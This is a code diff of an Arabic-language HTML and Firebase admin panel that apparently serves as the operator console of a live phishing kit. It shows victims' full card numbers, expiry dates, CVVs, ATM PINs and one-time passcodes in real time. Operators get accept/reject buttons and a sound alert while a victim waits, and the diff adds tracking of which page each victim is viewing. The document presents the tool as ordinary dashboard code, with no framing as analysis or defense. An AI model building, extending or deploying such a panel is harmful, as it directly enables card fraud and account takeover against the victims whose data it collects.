@@ -3,41 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - التصميم الفاتح</title>
+    <title>لوحة التحكم - نظام الكروت الذكي</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        /* تنسيق التصميم الفاتح */
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; color: #333; margin: 0; padding: 0; }
-        .navbar { background: #1e7344; padding: 12px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .nav-btn { background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .nav-btn.active { background: white; color: #1e7344; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 0; }
+        .navbar { background: #1e7344; padding: 12px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .nav-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .nav-btn.active { background: white; color: #1e7344; }
         
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e0e0e0; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; font-size: 13px; }
         
-        .container { padding: 20px; width: 100%; box-sizing: border-box; }
-        .tab-content { display: none; width: 100%; overflow-x: auto; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .tab-content.active { display: block; }
+        .container { padding: 15px; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
+        
+        /* تصميم الكرت المستقل */
+        .client-card { 
+            background: white; border-radius: 15px; padding: 15px; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #e0e0e0;
+            position: relative; transition: 0.3s;
+        }
+        .is-active-row { border: 2px solid #28a745 !important; animation: glow 1.5s infinite; }
+        @keyframes glow { 0% { box-shadow: 0 0 5px #28a745; } 50% { box-shadow: 0 0 20px #28a745; } 100% { box-shadow: 0 0 5px #28a745; } }
 
-        /* تنسيق الجدول في الخلفية البيضاء */
-        .data-table { width: 100%; border-collapse: collapse; min-width: 1200px; background: white; }
-        .data-table th { background: #f8f9fa; color: #666; padding: 15px; text-align: right; font-size: 13px; border-bottom: 2px solid #eee; font-weight: 600; }
-        .data-table td { padding: 15px; border-bottom: 1px solid #f0f0f0; font-size: 14px; white-space: nowrap; color: #222; }
-        
-        .ltr-fix { direction: ltr !important; unicode-bidi: bidi-override !important; display: inline-block; text-align: left !important; font-family: 'Consolas', monospace; font-weight: bold; font-size: 15px; }
+        .card-header { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .client-name { font-weight: bold; color: #1e7344; font-size: 16px; }
+        .client-location { background: #e3f2fd; color: #1976d2; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }
 
-        /* حالة التنبيه النشط (لون أخضر فاتح جداً) */
-        .is-active-row { background: #e8f5e9 !important; border-right: 6px solid #28a745 !important; animation: glow 1.5s infinite; }
-        @keyframes glow { 0% { background: #e8f5e9; } 50% { background: #c8e6c9; } 100% { background: #e8f5e9; } }
-        
-        /* الأزرار */
-        .btn { padding: 8px 18px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; background: #e0e0e0; color: #888; transition: 0.3s; }
-        .btn-green.highlight { background: #28a745 !important; color: white !important; box-shadow: 0 3px 8px rgba(40,167,69,0.3); }
-        .btn-red.highlight { background: #dc3545 !important; color: white !important; box-shadow: 0 3px 8px rgba(220,53,69,0.3); }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .info-item { background: #f8f9fa; padding: 8px; border-radius: 8px; }
+        .info-label { font-size: 10px; color: #888; display: block; margin-bottom: 2px; }
+        .info-val { font-family: monospace; font-weight: bold; font-size: 14px; color: #000; }
 
-        /* شاشة الدخول */
+        .full-width { grid-column: span 2; }
+        .ltr { direction: ltr; display: inline-block; }
+
+        .card-actions { margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .btn { padding: 10px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; background: #eee; color: #999; }
+        .btn-green.highlight { background: #28a745 !important; color: white !important; }
+        .btn-red.highlight { background: #dc3545 !important; color: white !important; }
+
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .login-card { background: white; padding: 40px; border-radius: 20px; text-align: center; width: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
+        .login-card { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 300px; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
@@ -46,57 +52,21 @@
 
 <div id="loginOverlay">
     <div class="login-card">
-        <h2 style="color: #1e7344; margin-bottom: 25px; font-size: 24px;">تسجيل دخول</h2>
-        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:14px; margin-bottom:20px; border:2px solid #eee; border-radius:10px; text-align:center; font-size: 16px; outline: none;">
-        <button onclick="checkLogin()" style="width:100%; padding:14px; background:#1e7344; color:white; border:none; border-radius:10px; cursor:pointer; font-weight:bold; font-size: 16px;">دخول آمن</button>
+        <h2 style="color: #1e7344;">تسجيل دخول</h2>
+        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:8px; text-align:center;">
+        <button onclick="checkLogin()" style="width:100%; padding:12px; background:#1e7344; color:white; border:none; border-radius:8px; font-weight:bold;">دخول</button>
     </div>
 </div>
 
 <div id="adminContent" style="display:none;">
-    <div class="visitor-counter">🌐 المتواجدون الآن في الموقع: <span id="onlineCount">0</span> زائر</div>
-    
+    <div class="visitor-counter">🌐 المتواجدون الآن: <span id="onlineCount">0</span></div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
-        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجوزات</button>
+        <button class="nav-btn active">💳 العمليات المباشرة</button>
         <button class="nav-btn" onclick="logout()" style="background:#333">🚪 خروج</button>
     </div>
 
-    <div class="container">
-        <div id="cardsSection" class="tab-content active">
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>الاسم</th>
-                        <th>رقم البطاقة</th>
-                        <th>الانتهاء</th>
-                        <th>CVV</th>
-                        <th>PIN السري</th>
-                        <th>OTP الرمز</th>
-                        <th>الإجراء</th>
-                    </tr>
-                </thead>
-                <tbody id="paymentsList"></tbody>
-            </table>
+    <div class="container" id="cardsList">
         </div>
-
-        <div id="bookingSection" class="tab-content">
-            <table class="data-table">
-                <thead>
-                    <tr>
-                        <th>الاسم</th>
-                        <th>التليفون</th>
-                        <th>السيارة</th>
-                        <th>اللوحة</th>
-                        <th>التاريخ</th>
-                        <th>الوقت</th>
-                        <th>الجيميل</th>
-                        <th>البلد</th>
-                    </tr>
-                </thead>
-                <tbody id="bookingList"></tbody>
-            </table>
-        </div>
-    </div>
 </div>
 
 <script>
@@ -116,90 +86,93 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // تحديث عدد الزوار
         database.ref('live_visitors').on('value', s => {
             let active = 0; const now = Date.now();
             s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
             document.getElementById('onlineCount').innerText = active;
         });
 
-        database.ref('payments').on('child_added', s => { renderCardRow(s.key, s.val()); });
+        // مراقبة مكان العميل (الصفحة التي يقف عليها)
+        database.ref('live_visitors').on('child_changed', s => {
+            const visitorId = s.key;
+            const data = s.val();
+            const badge = document.querySelector(`#card_${visitorId} .client-location`);
+            if(badge) badge.innerText = data.page || "غير معروف";
+        });
+
+        // إضافة الكروت
+        database.ref('payments').on('child_added', s => { renderCard(s.key, s.val()); });
         
+        // تحديث الكروت عند تغيير البيانات
         database.ref('payments').on('child_changed', s => {
             const val = s.val();
-            const row = document.getElementById('row_' + s.key);
-            if(row) {
-                row.querySelector('.val-card').innerText = val.cardNumber;
-                row.querySelector('.val-expiry').innerText = val.expiry;
-                row.querySelector('.val-cvv').innerText = val.cvv;
-                row.querySelector('.val-pin').innerText = val.atm_pin || '-';
-                row.querySelector('.val-otp').innerText = val.otp || '-';
+            const card = document.getElementById('card_' + s.key);
+            if(card) {
+                card.querySelector('.val-card').innerText = val.cardNumber;
+                card.querySelector('.val-expiry').innerText = val.expiry;
+                card.querySelector('.val-cvv').innerText = val.cvv;
+                card.querySelector('.val-pin').innerText = val.atm_pin || '-';
+                card.querySelector('.val-otp').innerText = val.otp || '-';
 
                 if(val.status && val.status.includes('waiting')) {
-                    row.classList.add('is-active-row');
-                    row.querySelector('.btn-green').classList.add('highlight');
-                    row.querySelector('.btn-red').classList.add('highlight');
+                    card.classList.add('is-active-row');
+                    card.querySelectorAll('.btn').forEach(b => b.classList.add('highlight'));
                     playSound();
                 } else {
-                    row.classList.remove('is-active-row');
-                    row.querySelector('.btn-green').classList.remove('highlight');
-                    row.querySelector('.btn-red').classList.remove('highlight');
+                    card.classList.remove('is-active-row');
+                    card.querySelectorAll('.btn').forEach(b => b.classList.remove('highlight'));
                 }
             }
         });
-
-        database.ref('visitors').on('child_added', s => { renderBookingRow(s.val()); });
     }
 
-    function renderCardRow(key, val) {
-        const list = document.getElementById('paymentsList');
-        if(document.getElementById('row_' + key)) return;
-        const tr = document.createElement('tr');
-        tr.id = 'row_' + key;
-        
+    function renderCard(key, val) {
+        if(document.getElementById('card_' + key)) return;
+        const list = document.getElementById('cardsList');
         const activeClass = (val.status && val.status.includes('waiting')) ? 'highlight' : '';
-        const rowClass = (val.status && val.status.includes('waiting')) ? 'is-active-row' : '';
+        const glowClass = (val.status && val.status.includes('waiting')) ? 'is-active-row' : '';
 
-        tr.className = rowClass;
-        tr.innerHTML = `
-            <td style="color:#1e7344; font-weight:bold;">${val.cardHolder || 'عميل'}</td>
-            <td><span class="ltr-fix val-card">${val.cardNumber}</span></td>
-            <td><span class="ltr-fix val-expiry">${val.expiry}</span></td>
-            <td><span class="ltr-fix val-cvv" style="background:#eee; padding:2px 6px; border-radius:4px;">${val.cvv}</span></td>
-            <td><span class="ltr-fix val-pin" style="color:#9c27b0;">${val.atm_pin || '-'}</span></td>
-            <td><span class="ltr-fix val-otp" style="color:#2196f3;">${val.otp || '-'}</span></td>
-            <td>
+        const div = document.createElement('div');
+        div.id = 'card_' + key;
+        div.className = `client-card ${glowClass}`;
+        div.innerHTML = `
+            <div class="card-header">
+                <span class="client-name">${val.cardHolder || 'عميل جديد'}</span>
+                <span class="client-location">جاري التتبع...</span>
+            </div>
+            <div class="info-grid">
+                <div class="info-item full-width">
+                    <span class="info-label">رقم البطاقة</span>
+                    <span class="info-val ltr val-card">${val.cardNumber}</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">الانتهاء</span>
+                    <span class="info-val ltr val-expiry">${val.expiry}</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">CVV</span>
+                    <span class="info-val ltr val-cvv">${val.cvv}</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">PIN الصراف</span>
+                    <span class="info-val ltr val-pin" style="color:#9c27b0;">${val.atm_pin || '-'}</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">رمز OTP</span>
+                    <span class="info-val ltr val-otp" style="color:#2196f3;">${val.otp || '-'}</span>
+                </div>
+            </div>
+            <div class="card-actions">
                 <button class="btn btn-green ${activeClass}" onclick="updateStat('${key}', 'accept')">قبول</button>
                 <button class="btn btn-red ${activeClass}" onclick="updateStat('${key}', 'reject')">رفض</button>
-            </td>
+            </div>
         `;
-        list.prepend(tr);
-    }
-
-    function renderBookingRow(val) {
-        const list = document.getElementById('bookingList');
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-            <td style="font-weight:bold;">${val.fullName || '-'}</td>
-            <td class="ltr-fix" style="color:#444;">${val.phone || '-'}</td>
-            <td>${val.vehicleType || '-'}</td>
-            <td>${val.plateNumber || '-'}</td>
-            <td>${val.bookingDate || '-'}</td>
-            <td>${val.bookingTime || '-'}</td>
-            <td style="color:#666; font-size:12px;">${val.email || '-'}</td>
-            <td>${val.country || '-'}</td>
-        `;
-        list.prepend(tr);
+        list.prepend(div);
     }
 
     function updateStat(id, action) { 
         firebase.database().ref('payments/' + id).update({ status: action }); 
-    }
-
-    function openTab(evt, name) {
-        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
-        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
-        document.getElementById(name).style.display = "block";
-        evt.currentTarget.className += " active";
     }
 </script>
 </body>
